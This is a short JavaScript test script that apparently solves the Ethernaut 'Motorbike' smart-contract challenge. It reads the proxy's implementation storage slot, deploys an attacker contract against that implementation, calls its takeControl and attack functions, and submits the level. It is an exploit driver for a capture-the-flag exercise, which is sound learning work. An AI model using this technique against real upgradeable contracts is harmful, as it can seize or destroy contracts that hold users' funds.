const { expect } = require("chai");
const { createChallenge, submitLevel } = require("./utils");

async function getChallenge() {
  const factory = await ethers.getContractFactory("Motorbike");
  const challengeAddress = await createChallenge(`0x3A78EE8462BD2e31133de2B8f1f9CBD973D6eDd6`, ethers.parseEther(`0.001`))
  const challenge = factory.attach(challengeAddress);
  return challenge;
}

it("Solves 25-Motorbike", async function () {
  const challenge = await getChallenge();
  const challengeAddress = await challenge.getAddress();

  const implementationStorage = await ethers.provider.getStorage(
    challengeAddress,
    "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc"
  );
  const implementationAddress = "0x" + implementationStorage.slice(-40);

  console.log(implementationStorage)
  console.log(implementationAddress)

  const factory = await ethers.getContractFactory("MotorbikeAttacker");
  const contract = await factory.deploy(implementationAddress);
  await contract.waitForDeployment();

  await contract.takeControl();
  await contract.attack();

  expect(await submitLevel(await challenge.getAddress())).to.equal(true);
});
